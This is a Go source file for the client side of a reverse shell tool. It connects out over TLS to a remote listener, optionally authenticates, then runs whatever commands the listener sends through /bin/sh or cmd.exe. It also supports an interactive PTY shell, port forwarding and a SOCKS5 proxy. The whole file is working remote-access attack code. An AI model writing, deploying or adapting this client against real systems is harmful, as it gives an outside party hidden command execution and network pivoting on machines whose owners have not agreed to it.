package client

import (
	"bufio"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/frjcomp/gots/pkg/protocol"
)

// ReverseClient represents a reverse shell client that connects to a listener
// and handles command execution and file transfers.
type ReverseClient struct {
	target            string
	sharedSecret      string // Optional shared secret for authentication
	certFingerprint   string // Optional expected certificate fingerprint
	conn              *tls.Conn
	reader            *bufio.Reader
	writer            *bufio.Writer
	isConnected       bool
	currentUploadPath string
	uploadChunks      []string
	runningCmd        *exec.Cmd
	ptyFile           *os.File   // PTY file for shell
	ptyCmd            *exec.Cmd  // Command running in PTY
	inPtyMode         bool       // Whether currently in PTY mode
	ptyMutex          sync.Mutex // Protects PTY state
	forwardHandler    *ForwardHandler // Port forwarding handler
	socksHandler      *SocksHandler   // SOCKS5 proxy handler
}

var (
	globalSessionID  string
	sessionIDOnce    sync.Once
)

// GetSessionID returns the process-wide session identifier used by this gotsr instance.
func GetSessionID() string {
	sessionIDOnce.Do(func() {
		globalSessionID = generateShortID()
	})
	return globalSessionID
}

// generateShortID creates an 8-char hex identifier.
func generateShortID() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		// Fallback to timestamp bytes if entropy fails
		ts := time.Now().UnixNano()
		b[0] = byte(ts)
		b[1] = byte(ts >> 8)
		b[2] = byte(ts >> 16)
		b[3] = byte(ts >> 24)
	}
	return hex.EncodeToString(b)
}

// end of session ID helpers

// NewReverseClient creates a new reverse shell client
func NewReverseClient(target, sharedSecret, certFingerprint string) *ReverseClient {
	return &ReverseClient{
		target:          target,
		sharedSecret:    sharedSecret,
		certFingerprint: certFingerprint,
	}
}

// Connect establishes a TLS connection to the listener
func (rc *ReverseClient) Connect() error {
	// Create TLS config with certificate pinning
	tlsConfig := &tls.Config{
		MinVersion:         tls.VersionTLS13, // Enforce TLS 1.3
		InsecureSkipVerify: true,             // Disable default verification; use custom VerifyPeerCertificate

		// Verify certificate chain and fingerprint BEFORE accepting connection
		VerifyPeerCertificate: func(
			rawCerts [][]byte,
			verifiedChains [][]*x509.Certificate,
		) error {
			// Must have at least one certificate
			if len(rawCerts) == 0 {
				return errors.New("no certificates provided by server")
			}

			// If fingerprint is provided, verify it (works for self-signed certs)
			if rc.certFingerprint != "" {
				// Hash the DER-encoded certificate directly (works for self-signed)
				hash := sha256.Sum256(rawCerts[0])
				fingerprint := hex.EncodeToString(hash[:])

				if fingerprint != rc.certFingerprint {
					return fmt.Errorf(
						"certificate fingerprint mismatch!\nExpected: %s\nReceived: %s\n⚠️ WARNING: Possible MITM attack!",
						rc.certFingerprint,
						fingerprint,
					)
				}
				log.Printf("✓ Certificate fingerprint validated: %s", fingerprint)
				return nil // Accept - fingerprint matched
			}

			// No fingerprint provided
			// Check if certificate passed standard chain validation (CA-signed certs)
			if len(verifiedChains) > 0 && len(verifiedChains[0]) > 0 {
				// Certificate verified against system root CAs
				log.Printf("✓ Certificate verified by system root CA")
				return nil
			}

			// Self-signed certificate and no fingerprint provided
			// Allow connection but warn user about security risk
			hash := sha256.Sum256(rawCerts[0])
			fingerprint := hex.EncodeToString(hash[:])
			log.Printf("⚠️  WARNING: Self-signed certificate detected without fingerprint verification!")
			log.Printf("⚠️  Certificate fingerprint: %s", fingerprint)
			return nil // Allow connection despite security risk
		},
	}

	// Establish TLS connection with validation
	conn, err := tls.Dial("tcp", rc.target, tlsConfig)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}

	rc.conn = conn
	rc.reader = bufio.NewReader(conn)
	rc.writer = bufio.NewWriter(conn)

	// Perform authentication if shared secret is provided
	if rc.sharedSecret != "" {
		// Send AUTH command
		authCmd := fmt.Sprintf("%s %s\n", protocol.CmdAuth, rc.sharedSecret)
		if _, err := rc.writer.WriteString(authCmd); err != nil {
			conn.Close()
			return fmt.Errorf("failed to send auth: %w", err)
		}
		if err := rc.writer.Flush(); err != nil {
			conn.Close()
			return fmt.Errorf("failed to flush auth: %w", err)
		}

		// Wait for AUTH_OK or AUTH_FAILED
		response, err := rc.reader.ReadString('\n')
		if err != nil {
			conn.Close()
			return fmt.Errorf("failed to read auth response: %w", err)
		}

		response = strings.TrimSpace(response)
		if response == protocol.CmdAuthFailed {
			conn.Close()
			return fmt.Errorf("authentication failed: invalid shared secret")
		}
		if response != protocol.CmdAuthOk {
			conn.Close()
			return fmt.Errorf("unexpected auth response: %s", response)
		}
		log.Printf("✓ Authentication successful")
	}

	rc.isConnected = true

	// Initialize forward handler with send function
	rc.forwardHandler = NewForwardHandler(func(msg string) {
		if rc.writer != nil {
			rc.writer.WriteString(msg)
			rc.writer.Flush()
		}
	})

	// Initialize SOCKS handler with send function
	rc.socksHandler = NewSocksHandler(func(msg string) {
		if rc.writer != nil {
			rc.writer.WriteString(msg)
			rc.writer.Flush()
		}
	})

	// Announce session identifier to listener and log it locally
	id := GetSessionID()
	log.Printf("Session ID: %s", id)
	if _, err := rc.writer.WriteString(fmt.Sprintf("%s %s\n", protocol.CmdIdent, id)); err == nil {
		_ = rc.writer.Flush()
	}
	return nil
}

// IsConnected returns whether the client is currently connected
func (rc *ReverseClient) IsConnected() bool {
	return rc.isConnected
}

// Close closes the connection
func (rc *ReverseClient) Close() error {
	if rc.conn == nil {
		return nil
	}
	rc.isConnected = false
	if rc.forwardHandler != nil {
		rc.forwardHandler.Close()
	}
	if rc.socksHandler != nil {
		rc.socksHandler.Close()
	}
	return rc.conn.Close()
}

// ExecuteCommand executes a shell command and returns the output
func (rc *ReverseClient) ExecuteCommand(command string) string {
	output, err := executeShellCommand(command)
	if err != nil {
		return fmt.Sprintf("Error: %v\n", err)
	}
	return output
}

// executeShellCommand executes a shell command and returns the output
func executeShellCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output)), err
	}
	return string(output), nil
}

// HandleCommands listens for commands and executes them
func (rc *ReverseClient) HandleCommands() error {
	var cmdBuffer strings.Builder

	for {
		// Set read deadline to allow graceful shutdown
		if rc.conn != nil {
			rc.conn.SetReadDeadline(time.Now().Add(protocol.ReadTimeout * time.Second))
		}
		line, err := rc.reader.ReadString('\n')
		if rc.conn != nil {
			rc.conn.SetReadDeadline(time.Time{})
		}

		cmdBuffer.WriteString(line)

		if errors.Is(err, bufio.ErrBufferFull) {
			// Command line exceeded buffer; keep accumulating until newline
			if cmdBuffer.Len() > protocol.MaxBufferSize {
				cmdBuffer.Reset()
			}
			continue
		}

		if err != nil {
			if err == io.EOF {
				return nil
			}
			if netErr, ok := err.(interface{ Timeout() bool }); ok && netErr.Timeout() {
				continue
			}
			return fmt.Errorf("read error: %w", err)
		}

		command := strings.TrimSpace(cmdBuffer.String())
		cmdBuffer.Reset()
		if command == "" {
			continue
		}

		// If in PTY mode, only handle PTY-specific commands
		if rc.inPtyMode {
			if command == protocol.CmdPtyExit {
				_ = rc.handlePtyExitCommand()
				continue
			}
			if strings.HasPrefix(command, protocol.CmdPtyData+" ") {
				if err := rc.handlePtyDataCommand(command); err != nil {
					log.Printf("Error handling PTY data: %v", err)
				}
				continue
			}
			if strings.HasPrefix(command, protocol.CmdPtyResize+" ") {
				if err := rc.handlePtyResizeCommand(command); err != nil {
					log.Printf("Error handling PTY resize: %v", err)
				}
				continue
			}
			// Ignore other commands in PTY mode
			continue
		}

		// Process command using extracted handler
		shouldContinue, err := rc.processCommand(command)
		if err != nil {
			log.Printf("Error processing command: %v", err)
			continue
		}
		if !shouldContinue {
			return nil
		}
	}
}
